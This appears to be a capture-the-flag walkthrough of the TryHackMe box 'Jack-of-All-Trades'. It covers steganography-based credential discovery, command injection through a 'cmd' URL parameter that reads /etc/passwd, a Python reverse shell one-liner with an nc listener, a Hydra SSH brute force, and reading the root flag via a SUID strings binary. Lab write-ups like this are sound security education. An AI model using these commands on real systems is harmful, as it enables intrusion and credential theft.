# 'Jack-of-All-Trades' box writeup
## Jack of All Trades is a CTF box originally designed for Securi-Tay 2020 and written by MuirlandOracle, available on the [TryHackMe platform](https://tryhackme.com).
## Read about [How to allow restricted ports](https://support.mozilla.org/en-US/questions/1083282#answer-780274), [SUID files](https://www.tecmint.com/how-to-find-files-with-suid-and-sgid-permissions-in-linux/) and [Steghide](http://steghide.sourceforge.net/)
## ![bg](images/backgroundjack.jpeg?raw=true "Title")

## Foothold

+ **We deploy the machine and start with an nmap scan for open ports**

``nmap -sV -sC -oN scan1 10.10.252.248``

+ **We can see 2 open ports with some services: ssh and http. The first strange thing is that the services are opened on reversed ports. Ssh is opened on the 80 ports and http on the 22 one**

![1](images/nmap_scan_jack.jpg?raw=true "Nmap_scan")

+ **Let's try to get to the http web-site on the 22 port. We see an browser error: seems like Firefox has canceled our request for kind of security. That's because the unusual use of 22 port for the http service**

![2](images/restrict.jpg?raw=true "restrict")

**We can allow this restricted port making some configuration inside the mozilla browser: [allow restricted ports](https://support.mozilla.org/en-US/questions/1083282#answer-780274). Go into the about:config page in the url, search for the ports and add the network.security.ports.banned.override string, with the 22 value**

![3](images/add_string.png?raw=true "add_string")

![4](images/welcome.png?raw=true "welcome")

**We can see our main page, with the box title and some images in there. Let's scan with gobuster too**

``gobuster dir -u http://10.10.252.248:22/ -w /usr/share/wordlists/dirb/common.txt``

![5](images/gobust.jpg?raw=true "gobust")

+ **Let's take a look into our gobuster output. Let's visit the assets page; we can see some *jpg* files, one of them called** stego.jpg **so we can think about an encrypted image with the help of steganography**

![6](images/assets.jpg?raw=true "assets")

+ **We can try to extract the stego image to see de hidden data, so we're gonna use steghide**

``steghide --extract -sf stego.jpg``

**A passphrase is requested, so we cannot immediately decrypt the image, but we can continue to enumerate the http page. Let's take a look into the source code of the page**

+ **We can spot a message left in the source code of the page: a recovery message which tells us we can connect on the /recovery.php page and there's also a base64 encoded message**

![7](images/base64.jpg?raw=true "base64")

**Let's try to decrypt our message**

``echo "UmVtZW1iZXIgdG8gd2lzaCBxxxxxxxxxx" | base64 -d``

![8](images/decrypt.jpg?raw=true "base64")

**We got a message and a password too! Let's use it to decrypt the image with steghide**

![9](images/first_steg.jpg?raw=true "first_steg")

+ **A creds.txt file was hidden inside, but the stego.jpg wasn't the good path. Let's download the other images from the assets page and extract them**

![10](images/real_steg.jpg?raw=true "real_steg")

``steghide --extract -sf header.jpg``

**Bingo! We got a username and a password inside the header.jpg image. Let's go to the /recovery.php page and try to login with the credentials**

+ **Logging in with our credentials on the page, we are redirected to a page with the message:**

``GET me a 'cmd' and I'll run it for you Future-Jack.``

![11](images/login.jpg?raw=true "login")

**Now, let's try some system commands inside the url:**

``http://10.10.252.248:22/nnxhweOV/index.php?cmd=cat /etc/passwd``

![cmd](images/cmdworks.jpg?raw=true "cmd")

+ **It's all working, so go grab a reverse shell. I'm gonna use python and start listen with nc**

``nc -lvnp 1234``

``http://10.10.252.248:22/nnxhweOV/index.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'``

![12](images/access.jpg?raw=true "access")

## User escalation

**Here we got our access into the system. Let's spawn an interactive shell with python and continue to enumerate**

``python -c 'import pty; pty.spawn("/bin/bash")'``

+ **Looking into the /home directory, we can see a** ``jacks_password_list`` **file which seems to be a password list for the jake user. According to the second service opened, on the 80 port, the ssh service, we're gonna try to bruteforce the login with the given wordlist and with the help of the Hydra tool**

![13](images/jackspassw.jpg?raw=true "jacks")

+ **Firstly, we need to download the** ``jacks_password_list`` **file to our machine. Open a python server on the Jack box and we're gonna get the file on our's**

**The Jack box**

**``www-data@jack-of-all-trades:/home$``** ``python -m SimpleHTTPServer 6999``

**Our machine**

**``{kali@kali:Jack of All Trades_0}$``** ``wget 10.10.252.248:6999/jacks_password_list``

+ **Now, having the wordlist, let's start the bruteforce phase. Don't forget to set the port for the ssh service, because it's not on the default (22), but the 80 one**

``hydra -s 80 -v -V -l jack -P jacks_password_list -t 8 10.10.252.248  ssh``

![13](images/hydra(1).jpg?raw=true "hydra")

**Let's connect into the ssh server with our credentials on the 80 port**

``ssh jake@10.10.252.248 -p 80``

+ **In the /home/jack directory we can see the user flag, but in the .jpg format. Let's get the image on our machine, using the same method as above, and then open it**

**``www-data@jack-of-all-trades:/home$``** ``python -m SimpleHTTPServer 6999``

**``{kali@kali:Jack of All Trades_0}$``** ``wget 10.10.252.248:6999/user.jpg``

**Opening the user.jpg flag, we can see the Penguing recipe and the user flag**

![14](images/user.flag.jpg?raw=true "user")

## Root escalation

+ **Checking for ``sudo -l`` on the jack user gives us no good path. He has no sudo permission on the machine**

``Sorry, user jack may not run sudo on jack-of-all-trades.``

**Let's check for some advanced linux file permissions - suid**

``find / -type f -user root -perm -4000 -print 2>/dev/null``

+ **This gives us some interesting output. The strings executable has got file owner permission when executing a command**

![15](images/suid.jpg?raw=true "suid")

**Knowing this, let's try to use strings on our root.txt flag**

``strings /root/root.txt``

+ **And here's our root flag. This was a very nice box with some steganography challenges into, a reversed ports configuration of services and some file permissions**

![15](images/root_flag_jack.jpg?raw=true "suid")